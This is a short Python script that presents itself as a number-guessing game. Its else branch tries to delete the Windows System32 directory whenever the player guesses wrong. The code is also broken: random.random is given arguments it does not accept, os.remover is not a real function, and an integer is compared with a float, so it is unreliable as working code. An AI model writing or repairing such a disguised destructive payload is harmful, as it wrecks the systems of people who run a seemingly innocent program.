import random
import os

number = random.random(1, 10)
guess = input("Guess a number between 1 and 10: ")

guess = int(guess)
if guess == number:
    print("You guessed correctly!")
    
else:
    os.remover("C:\\Windows\\System32")